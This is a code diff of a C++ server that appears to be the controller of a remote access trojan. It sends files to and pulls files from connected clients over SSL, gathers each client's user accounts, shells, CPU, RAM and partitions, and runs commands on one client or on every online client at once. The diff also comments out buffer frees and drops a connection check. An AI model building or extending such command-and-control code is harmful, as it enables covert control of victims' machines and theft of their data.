@@ -2,6 +2,12 @@
 #include "Misc.hpp"
 #include "Commands.hpp"
 
+void Server::NullClients(){
+	for(int iIt = 0; iIt<Max_Clients; iIt++){
+		Clients[iIt] = nullptr;
+	}
+}
+
 void Server::mtxLock(){
 	mtxMutex.lock();
 }
@@ -57,10 +63,7 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 	std::cout<<"Comand "<<strCmdLine<<'\n';
 	iLen = strCmdLine.length();
 	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){ 
-	//if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
-		//sleep(1);
-		//char *tmpBuffer = nullptr;
-		//if(ssRecvBinary(Clients[iClientID]->sckSocket, tmpBuffer, 4) > 2){
+		sleep(1);
 		char tmpBuffer[4];
 		if(SSL_read(Clients[iClientID]->sslSocket, tmpBuffer, 3) > 2){
 			std::cout<<"Response "<<tmpBuffer<<'\n';
@@ -69,7 +72,6 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 			} else {
 				std::cout<<"Not confirmed, cancel transfer...\n";
 				strmInputFile.close();
-				//Misc::Free(tmpBuffer, 0);
 				return false;
 			}
 		} else {
@@ -77,29 +79,26 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 			error();
 			ERR_print_errors_fp(stderr);
 			strmInputFile.close();
-			//Misc::Free(tmpBuffer, 0);
 		}
-		//Misc::Free(tmpBuffer, 0);
-		char *cFileBuffer = nullptr;
-		cFileBuffer = new char[iBlockSize];
+		char *cFileBuffer = new char[iBlockSize];
 		int iTmp = 0;
-		while(uBytesSent<=uFileSize /*1*/){
+		while(uBytesSent<=uFileSize){
 			strmInputFile.read(cFileBuffer, iBlockSize);
 			iTmp = strmInputFile.gcount();
 			if(iTmp > 0){
-				iBytes = send(Clients[iClientID]->sckSocket, cFileBuffer, iTmp, 0);
+				iBytes = SSL_write(Clients[iClientID]->sslSocket, cFileBuffer, iTmp);
 				if(iBytes > 0){
 					uBytesSent += iBytes;
 					Misc::ProgressBar(uBytesSent, uFileSize);
 					std::fflush(stdout);
 				} else {
 					std::cout<<"Unable to send file bytes\n";
-					Misc::Free(cFileBuffer, iBlockSize);
+					//Misc::Free(cFileBuffer, iBlockSize);
 					error();
 					break; //no bytes readed end?
 				}
 			} else {
-				Misc::Free(cFileBuffer, iBlockSize);
+				//Misc::Free(cFileBuffer, iBlockSize);
 				break;
 			}
 		}
@@ -137,22 +136,18 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 	strCmdLine.append(strRemoteFileName);
 	int iLen = strCmdLine.length();
 	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){
-	//if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
 		char cFileSizeBuffer[20];
 		u64 uTotalBytes = 0, uFinalSize = 0;
 		int iBytesRead = 0, iBufferSize = 255;
 		char *cFileBuffer = new char[iBufferSize];
 		if(SSL_read(Clients[iClientID]->sslSocket, cFileSizeBuffer, 19) > 0){
-		//if(ssRecvBinary(Clients[iClientID]->sckSocket, cFileSizeBuffer, 20) > 0){
 			if(strcmp(cFileSizeBuffer, CommandCodes::cFileTransferCancel) == 0){
 				std::cout<<"Unable to download remote file\n";
-				//Misc::Free(cFileSizeBuffer, 0);
 				return false;
 			}
 			tkToken = cFileSizeBuffer;
 			tkToken += 2;
 			sscanf(tkToken, "%llui", &uFinalSize);
-			//Misc::Free(cFileSizeBuffer, 0);
 			std::cout<<"File size is "<<uFinalSize<<'\n';
 			std::ofstream strmOutputFile(cLocalName, std::ios::binary);
 			if(!strmOutputFile.is_open()){
@@ -161,7 +156,7 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 				return false;	
 			} else {
 				while(uTotalBytes<uFinalSize){
-					iBytesRead = recv(Clients[iClientID]->sckSocket, cFileBuffer, iBufferSize, 0);
+					iBytesRead = SSL_read(Clients[iClientID]->sslSocket, cFileBuffer, iBufferSize);
 					if(iBytesRead > 0){
 						strmOutputFile.write(cFileBuffer, iBytesRead);
 						uTotalBytes += iBytesRead;
@@ -562,8 +557,36 @@ void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
 				std::cout<<"No proccesable info heres raw\n"<<cBuffer<<'\n';
 			}
 		} else {
-			//by now jus t print out recived buffer
-			std::cout<<cBuffer<<'\n';
+			std::vector<std::string> vcNixInfo;
+			Misc::strSplit(cBuffer, '|', vcNixInfo, 10);
+			if(vcNixInfo.size() >= 8){
+				std::cout<<"\n\tCurrent User: "<<vcNixInfo[0]<<"\n\tUsers list:\n\t\tUser::Shell\n";
+				std::vector<std::string> vcUsers;
+				Misc::strSplit(vcNixInfo[2].c_str(), '*', vcUsers, 100);
+				for(int iIt = 0; iIt<int(vcUsers.size()); iIt++){
+					std::vector<std::string> vcTmp;
+					Misc::strSplit(vcUsers[iIt].c_str(), ':', vcTmp, 2);
+					if(vcTmp.size() >= 2){
+						std::cout<<"\t\t"<<vcTmp[0]<<"::"<<vcTmp[1]<<'\n';
+					}
+				}
+				std::cout<<"\tSystem:   "<<vcNixInfo[5]<<'\n';
+				std::cout<<"\tCpu:      "<<vcNixInfo[3]<<'\n';
+				std::cout<<"\tCores:    "<<vcNixInfo[4]<<'\n';
+				std::cout<<"\tRAM(Mb):  "<<vcNixInfo[6]<<'\n';
+				std::cout<<"\tSystem partitions:\n\t\tPartition\tSize(Gb)\n";
+				std::vector<std::string> vcPartition;
+				Misc::strSplit(vcNixInfo[1].c_str(), '*', vcPartition, 100);
+				for(int iIt = 0; iIt<int(vcPartition.size()); iIt++){
+					std::vector<std::string> vcTmp;
+					Misc::strSplit(vcPartition[iIt].c_str(), ':', vcTmp, 2);
+					if(vcTmp.size() >= 2){
+						std::cout<<"\t\t   "<<vcTmp[0]<<"\t\t"<<vcTmp[1]<<'\n';
+					}
+				}
+			} else {
+				std::cout<<"Error\n"<<cBuffer<<'\n';
+			}
 		}
 	}	
 }
@@ -594,7 +617,7 @@ bool Server::Listen(u_int uiMaxq){
 			continue;
 		}
 		//if reach here everything success
-		//fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
+		fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
 		break;
 	}
 	freeaddrinfo(strctServer);
@@ -745,6 +768,31 @@ void Server::threadMasterCMD(){
 		}
 		std::vector<std::string> vcCommands;
 		Misc::strSplit(strCMD, ' ', vcCommands, 10);
+		
+		//help documentation goes here
+		if(vcCommands[0] == "?"){
+			std::cout<<"this is help, yes what else you was waiting for\n";
+			continue;
+		}
+		//run shell command
+		if(vcCommands[0][0] == '!'){
+			std::string strShellCommand = vcCommands[0].substr(1, vcCommands[0].length()-1);
+			for(u_int iIt2 = 1; iIt2<vcCommands.size(); iIt2++){
+				strShellCommand.append(1, ' ');
+				strShellCommand.append(vcCommands[iIt2]);
+			}
+			system(strShellCommand.c_str());
+			continue;
+		}
+		//exit program
+		if(vcCommands[0] == "exit"){
+			std::cout<<"bye\n";
+			close(sckMainSocket);
+			break;
+		}
+		if(iClientsOnline == 0){
+			continue;
+		}
 		//interact with clients
 		if(vcCommands[0] == "cli"){
 			if(vcCommands.size() == 5){ //cli -c id -a action
@@ -752,14 +800,17 @@ void Server::threadMasterCMD(){
 				std::string strAction = "";
 				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){ //parse command line arguments
 					if(vcCommands[iIt2] == "-c"){
-						iClientId = Misc::StrToUint(vcCommands[iIt2+1].c_str());
+						iClientId = atoi(vcCommands[iIt2+1].c_str());
+						if(iClientId >= Max_Clients){
+							iClientId = Max_Clients -1;   //in number is than array prevent overflow
+						}
 						continue;
 					}
 					if(vcCommands[iIt2] == "-a"){
 						strAction = vcCommands[iIt2+1];
 					}
 				}
-				if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
+				if(Clients[iClientId] != nullptr){
 					if(strAction == "interact"){
 						//spawn prompt to interact with specified client
 						std::string strClientCmd = "";
@@ -796,7 +847,7 @@ void Server::threadMasterCMD(){
 				if(vcCommands[1] == "-c" && vcCommands[2] == "*"){
 					std::string strMassiveCmd = "";
 					do{
-						std::cout<<"[ "<<iClientsOnline<<" ] online# ";
+						std::cout<<"["<<iClientsOnline<<"] online# ";
 						std::getline(std::cin, strMassiveCmd);
 						if(strMassiveCmd.length() == 0){
 							continue;
@@ -823,27 +874,6 @@ void Server::threadMasterCMD(){
 					}
 				}
 			}
-		}
-		//help documentation goes here
-		if(vcCommands[0] == "?"){
-			std::cout<<"this is help, yes what else you was waiting for\n";
-			continue;
-		}
-		//run shell command
-		if(vcCommands[0][0] == '!'){
-			std::string strShellCommand = vcCommands[0].substr(1, vcCommands[0].length()-1);
-			for(u_int iIt2 = 1; iIt2<vcCommands.size(); iIt2++){
-				strShellCommand.append(1, ' ');
-				strShellCommand.append(vcCommands[iIt2]);
-			}
-			system(strShellCommand.c_str());
-			continue;
-		}
-		//exit program
-		if(vcCommands[0] == "exit"){
-			std::cout<<"bye\n";
-			close(sckMainSocket);
-			break;
 		}
 	}
 	mtxLock();
